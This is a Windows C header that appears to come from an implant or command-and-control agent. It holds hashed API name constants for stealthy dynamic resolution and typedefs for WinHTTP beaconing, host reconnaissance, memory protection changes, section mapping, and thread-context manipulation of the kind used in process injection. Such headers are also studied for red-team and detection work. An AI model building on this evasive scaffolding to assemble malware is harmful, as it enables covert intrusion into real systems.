#pragma once
#include <windows.h>





#define HASHED_LocalAlloc     0x73cebc5b
#define HASHED_LocalFree      0xa66df372

#define HASHED_LocalReAlloc   0xabad9db2
#define HASHED_GetProcAddress 0xcf31bb1f
#define HASHED_LoadLibraryA   0x5fbff0fb
#define HASHED_FreeLibrary    0x30eece3c

#define HASHED_RtlExitUserThread 0x8e492b88
#define NTALLOCATEVIRTUALMEMORY_HASH 0x6793c34c
#define NTPROTECTVIRTUALMEMORY_HASH  0x082962c8
#define NTFLUSHINSTRUCTIONCACHE_HASH 0x80183adf
#define HASHED_NtDelayExecution      0x0a49084a
#define HASHED_NtCreateSection       0xd02e20d0
#define HASHED_NtMapViewOfSection    0x231f196a
#define HASHED_CreateFileA           0xeb96c5fa
#define HASHED_GetComputerNameExA    0xd252a5f3
#define HASHED_GetUserNameA          0x9bc3ab46
#define HASHED_GetModuleFileNameA    0x13b8a14d
#define HASHED_GetUserGeoID          0x9b47362c
#define HASHED_GetGeoInfoA           0x35fe32ad



#define HASHED_ntdll         0x22d3b5ed
#define HASHED_kernel32      0x7040ee75

#define HASHED_WinHttpOpen               0x5e4f39e5
#define HASHED_WinHttpConnect            0x7242c17d
#define HASHED_WinHttpOpenRequest        0xeab7b9ce
#define HASHED_WinHttpAddRequestHeaders  0xed7fcb41
#define HASHED_WinHttpSendRequest        0xb183faa6
#define HASHED_WinHttpReceiveResponse    0x146c4925
#define HASHED_WinHttpQueryHeaders       0x389cefa5
#define HASHED_WinHttpQueryDataAvailable 0x34cb8684
#define HASHED_WinHttpReadData           0x7195e4e9
#define HASHED_WinHttpSetOption          0xa18b94f8
#define HASHED_WinHttpCloseHandle        0x36220cd5

#define HASHED_CreateThread                0x7f08f451
#define HASHED_NtFreeVirtualMemory         0x471aa7e9
#define HASHED_RegisterWaitForSingleObject 0xccf99aff
#define HASHED_CloseHandle                 0x3870ca07
#define HASHED_CreateProcessA              0xaeb52e19
#define HASHED_NtWriteVirtualMemory        0x95f3a792
#define HASHED_NtOpenProcessToken          0x7bd07459
#define HASHED_NtQueryInformationToken     0x2ce5a244

#define HASHED_NtResumeThread              0x2c7b3d30
#define HASHED_NtGetContextThread          0x9e0e1a44
#define HASHED_NtSetContextThread          0x308be0d0

typedef HLOCAL(WINAPI *pLocalAlloc)(UINT uFlags, SIZE_T uBytes);
typedef HLOCAL(WINAPI* pLocalReAlloc)(HLOCAL hMem, SIZE_T uBytes, UINT uFlags);
typedef HLOCAL(WINAPI *pLocalFree)(HLOCAL);
typedef FARPROC(WINAPI *pGetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
typedef HMODULE(WINAPI* pLoadLibraryA)(LPCSTR dllName);

typedef BOOL(WINAPI* pGetUserNameA)(LPSTR lpBuffer, LPDWORD pcbBuffer);
typedef BOOL(WINAPI* pGetComputerNameExA)(COMPUTER_NAME_FORMAT NameType, LPSTR lpBuffer, LPDWORD lpnSize);
typedef DWORD(WINAPI* pGetModuleFileNameA)(HMODULE hModule, LPSTR lpFileName, DWORD nSize);
typedef GEOID(WINAPI* pGetUserGeoId)(GEOCLASS GeoClass);
typedef int  (WINAPI* pGetGeoInfoA)(GEOID Location, GEOTYPE GeoType, LPSTR lpGeoData, int cchData, LANGID LanId);



#define HINTERNET LPVOID

typedef HINTERNET(WINAPI* pWinHttpOpen)(LPCWSTR pszAgentW, DWORD dwAccessType, LPCWSTR pszProxyW, LPCWSTR pszProxyBypassW, DWORD dwFlags);
typedef HINTERNET(WINAPI* pWinHttpConnect)(HINTERNET hSession, LPCWSTR pswzServerName, WORD nServerPort, DWORD dwReserved);
typedef HINTERNET(WINAPI* pWinHttpOpenRequest)(HINTERNET hConnect, LPCWSTR pwzsVerb, LPCWSTR lpszObjectName, LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR* ppwszAcceptTypes, DWORD dwFlags);
typedef BOOL     (WINAPI* pWinHttpAddRequestHeaders)(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwModifiers);
typedef BOOL     (WINAPI* pWinHttpSendRequest)(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptinalLength, DWORD dwTotalLength, DWORD_PTR dwContext);
typedef BOOL     (WINAPI* pWinHttpReceiveResponse)(HINTERNET hRequest, LPVOID lpReserved);
typedef BOOL     (WINAPI* pWinHttpQueryHeaders)(HINTERNET hRequest, DWORD dwInfoLevel, LPCWSTR pwszName, LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex);
typedef BOOL     (WINAPI* pWinHttpQueryDataAvailable)(HINTERNET hRequest, LPDWORD lpdwNumberOfBytesAvailable);
typedef BOOL     (WINAPI* pWinHttpReadData)(HINTERNET hRequest, LPVOID dwBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
typedef BOOL     (WINAPI* pWinHttpSetOption)(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength);
typedef BOOL     (WINAPI* pWinHttpCloseHandle)(HINTERNET hInternet);



typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
    HANDLE    ProcessHandle,
    PVOID     *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
);

typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(
    HANDLE  ProcessHandle,
    PVOID   *BaseAddress,
    PSIZE_T RegionSize,
    ULONG   NewProtect,
    PULONG  OldProtect
);
typedef VOID(NTAPI *pRtlExitUserThread)(NTSTATUS ExitStatus);

typedef NTSTATUS (NTAPI *pNtFlushInstructionCache)(
    HANDLE  ProcessHandle,
    PVOID   BaseAddress,
    SIZE_T  Length
);
typedef NTSTATUS (NTAPI *pNtFreeVirtualMemory)(
    HANDLE  ProcessHandle,
    PVOID   *BaseAddress,
    PSIZE_T RegionSize,
    ULONG   FreeType
);

typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(
    HANDLE  ProcessHandle,
    PVOID   BaseAddress,
    PVOID   Buffer,
    ULONG   NumberOfBytesToWrite,
    PULONG  NumberOfBytesWritten
);

typedef HANDLE (WINAPI *pCreateFileA)(
    LPCSTR                lpFileName,
    DWORD                 dwDesiredAccess,
    DWORD                 dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    DWORD                 dwCreationDisposition,
    DWORD                 dwFlagsAndAttributes,
    HANDLE                hTemplateFile
);

typedef NTSTATUS (NTAPI *pNtCreateSection)(
    PHANDLE            SectionHandle,
    ACCESS_MASK        DesiredAccess,
    PVOID              ObjectAttributes,
    PLARGE_INTEGER     MaximumSize,
    ULONG              SectionPageProtection,
    ULONG              AllocationAttributes,
    HANDLE             FileHandle
);

typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(
    HANDLE          SectionHandle,
    HANDLE          ProcessHandle,
    PVOID           *BaseAddress,
    ULONG_PTR       ZeroBits,
    SIZE_T          CommitSize,
    PLARGE_INTEGER  SectionOffset,
    PSIZE_T         ViewSize,
    DWORD           InheritDisposition,
    ULONG           AllocationType,
    ULONG           Win32Protect
);


typedef HANDLE (WINAPI *pCreateThread)(
    LPSECURITY_ATTRIBUTES  lpThreadAttributes,
    SIZE_T                 dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID                 lpParameter,
    DWORD                  dwCreationFlags,
    LPDWORD                lpThreadId
);


typedef NTSTATUS(NTAPI *pNtResumeThread)(HANDLE hThread, PULONG PreCOunt);

typedef BOOL (WINAPI *pCreateProcessA)(
    LPCSTR                lpApplicationName,
    LPSTR                 lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL                  bInheritHandles,
    DWORD                 dwCreationFlags,
    LPVOID                lpEnvironment,
    LPCSTR                lpCurrentDirectory,
    LPSTARTUPINFOA        lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
);



typedef BOOL (WINAPI *pRegisterWaitForSingleObject)(
    PHANDLE            phNewWaitObject,
    HANDLE             hObject,
    WAITORTIMERCALLBACK Callback,
    PVOID              Context,
    ULONG              dwMilliseconds,
    ULONG              dwFlags
);

typedef NTSTATUS(NTAPI* pNtOpenProcessToken)(HANDLE hProc, ACCESS_MASK mask, PHANDLE TokenHandle);
typedef NTSTATUS(NTAPI* pNtQueryInformationToken)(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, PVOID TokenInformation, ULONG TokenInformationLength, PULONG ReturnLength);

typedef BOOL (WINAPI *pCloseHandle)(HANDLE hObject);
typedef BOOL (WINAPI *pFreeLibrary)(HMODULE hLibModule);
typedef NTSTATUS(NTAPI* pNtDelayExecution)(BOOL Alertable, PLARGE_INTEGER Delay);

typedef NTSTATUS(NTAPI *pNtGetContextThread)(HANDLE hThread, PCONTEXT ctx);
typedef NTSTATUS(NTAPI *pNtSetContextThread)(HANDLE hThread, PCONTEXT ctx);

typedef struct _Win32 {
    // win32
    pLocalAlloc      LocalAlloc;
    pLocalFree       LocalFree;
    pLocalReAlloc    LocalReAlloc;
    pGetProcAddress  GetProcAddress;
    pLoadLibraryA    LoadLibraryA;
    pRegisterWaitForSingleObject RegisterWaitForSingleObject;
    pCloseHandle CloseHandle;
    pCreateThread CreateThread;
    pGetUserNameA GetUserNameA;
    pGetComputerNameExA GetComputerNameExA;
    pGetModuleFileNameA GetModuleFileNameA;
    pGetUserGeoId       GetUserGeoId;
    pGetGeoInfoA        GetGeoInfoA;
    
    pCreateProcessA CreateProcessA;
    pCreateFileA    CreateFileA;
    pFreeLibrary FreeLibrary;


    pRtlExitUserThread RtlExitUserThread;
    pNtProtectVirtualMemory NtProtectVirtualMemory;
    pNtAllocateVirtualMemory NtAllocateVirtualMemory;
    pNtFlushInstructionCache NtFlushInstructionCache;
    pNtFreeVirtualMemory NtFreeVirtualMemory;
    pNtWriteVirtualMemory NtWriteVirtualMemory;
    pNtCreateSection      NtCreateSection;
    pNtMapViewOfSection   NtMapViewOfSection;
    pNtDelayExecution    NtDelayExecution;
    pNtResumeThread      NtResumeThread;
    pNtGetContextThread NtGetContextThread;
    pNtSetContextThread NtSetContextThread;
    pNtOpenProcessToken NtOpenProcessToken;
    pNtQueryInformationToken NtQueryInformationToken;

    // winhttp
    pWinHttpOpen               WinHttpOpen;
    pWinHttpConnect            WinHttpConnect;
    pWinHttpOpenRequest        WinHttpOpenRequest;
    pWinHttpAddRequestHeaders  WinHttpAddRequestHeaders;
    pWinHttpSendRequest        WinHttpSendRequest;
    pWinHttpReceiveResponse    WinHttpReceiveResponse;
    pWinHttpQueryHeaders       WinHttpQueryHeaders;
    pWinHttpQueryDataAvailable WinHttpQueryDataAvailable;
    pWinHttpReadData           WinHttpReadData;
    pWinHttpSetOption          WinHttpSetOption;
    pWinHttpCloseHandle        WinHttpCloseHandle;
} Win32, *PWin32;

typedef struct _Modules {
    HMODULE ntdll;
    HMODULE kernel32;
    HMODULE winhttp;
    PVOID TextSection;
    SIZE_T TextSize;
    DWORD oldPerms;
} Modules;
